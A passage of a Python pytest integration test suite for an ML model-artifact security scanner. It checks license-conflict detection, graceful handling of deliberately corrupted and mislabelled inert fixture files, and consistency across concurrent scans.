        with zipfile.ZipFile(zip_path, "w") as zip_file:
            for root, dirs, files in os.walk(model_dir):
                for file in files:
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, temp_dir)
                    zip_file.write(file_path, arcname)
        
        async with model_total_client as client:
            result = await client.scan_artifact(
                model_id="license-compliance-test",
                model_name="license-check-test",
                model_version="1.0.0",
                model_url=f"{server_url}/license_test.zip",
                org_id="test-license-org"
            )
        
        # Should detect license conflicts and GPL contamination
        license_issues = [issue for issue in result.issues 
                        if issue.type == IssueType.LICENSE]
        assert len(license_issues) > 0, "Should detect license compliance issues"
        
        # Check for GPL contamination warning
        gpl_issues = [issue for issue in license_issues 
                     if 'GPL' in issue.description or 'copyleft' in issue.description.lower()]
        assert len(gpl_issues) > 0, "Should detect GPL license contamination"

    @pytest.mark.asyncio
    async def test_corrupted_files_handling(self, docker_compose_setup, model_total_client, test_file_server):
        """
        Test handling of corrupted and malformed files.
        """
        server_url, temp_dir = test_file_server
        
        model_dir = os.path.join(temp_dir, "corrupted_test")
        os.makedirs(model_dir, exist_ok=True)
        
        # Corrupted pickle file
        with open(os.path.join(model_dir, "corrupted.pkl"), "wb") as f:
            f.write(b"PICKLE")  # Invalid pickle magic bytes
            f.write(b"\x80\x04")  # Valid protocol
            f.write(b"CORRUPTED_DATA_HERE" * 100)
        
        # Truncated model file
        with open(os.path.join(model_dir, "truncated_model.pth"), "wb") as f:
            # Start of valid PyTorch file (ZIP format)
            f.write(b"PK\x03\x04")
            f.write(b"\x14\x00\x00\x00")
            # Truncate abruptly
            f.write(b"TRUNCATED")
        
        # Malformed JSON
        with open(os.path.join(model_dir, "config.json"), "w") as f:
            f.write('{"model": "test", "layers": [1, 2, 3')  # Missing closing brackets
        
        # File with wrong extension
        with open(os.path.join(model_dir, "actually_executable.txt"), "wb") as f:
            f.write(b"MZ\x90\x00")  # PE executable header
            f.write(b"\x00" * 60)
            f.write(b"This program cannot be run in DOS mode")
        
        # Archive within archive with corruption
        inner_corrupt = os.path.join(model_dir, "inner.zip")
        with open(inner_corrupt, "wb") as f:
            f.write(b"PK\x03\x04")  # ZIP header
            f.write(b"CORRUPT" * 1000)
        
        zip_path = os.path.join(temp_dir, "corrupted_test.zip")
        with zipfile.ZipFile(zip_path, "w") as zip_file:
            for root, dirs, files in os.walk(model_dir):
                for file in files:
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, temp_dir)
                    zip_file.write(file_path, arcname)
        
        async with model_total_client as client:
            # Should handle corrupted files gracefully
            result = await client.scan_artifact(
                model_id="corrupted-files-test",
                model_name="corruption-handling-test",
                model_version="1.0.0",
                model_url=f"{server_url}/corrupted_test.zip",
                org_id="test-corrupt-org"
            )
        
        # Should complete scan despite corrupted files
        assert result is not None, "Should handle corrupted files without crashing"
        
        # May detect security issues from mismatched extensions
        security_issues = [issue for issue in result.issues 
                         if issue.type == IssueType.MALICIOUS_CODE]
        assert len(security_issues) > 0, "Should detect file type mismatches"

    @pytest.mark.asyncio
    async def test_race_condition_handling(self, docker_compose_setup, model_total_client, test_file_server):
        """
        Test handling of concurrent scans and race conditions.
        """
        import asyncio
        
        server_url, temp_dir = test_file_server
        
        # Create a simple test model
        model_dir = os.path.join(temp_dir, "race_test")
        os.makedirs(model_dir, exist_ok=True)
        
        with open(os.path.join(model_dir, "model.py"), "w") as f:
            f.write("import torch\nmodel = torch.nn.Linear(10, 1)")
        
        zip_path = os.path.join(temp_dir, "race_test.zip")
        with zipfile.ZipFile(zip_path, "w") as zip_file:
            for root, dirs, files in os.walk(model_dir):
                for file in files:
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, temp_dir)
                    zip_file.write(file_path, arcname)
        
        async with model_total_client as client:
            # Launch multiple concurrent scans of the same model
            scan_tasks = []
            for i in range(5):
                task = client.scan_artifact(
                    model_id=f"race-test-{i}",
                    model_name="race-condition-test",
                    model_version="1.0.0",
                    model_url=f"{server_url}/race_test.zip",
                    org_id="test-race-org"
                )
                scan_tasks.append(task)
            
            # Wait for all scans to complete
            results = await asyncio.gather(*scan_tasks, return_exceptions=True)
        
        # All scans should complete successfully
        successful_results = [r for r in results if not isinstance(r, Exception)]
        assert len(successful_results) == 5, "All concurrent scans should complete"
        
        # Results should be consistent
        first_issue_count = len(successful_results[0].issues)
        for result in successful_results[1:]:
            assert len(result.issues) == first_issue_count, \
                "Concurrent scans should produce consistent results"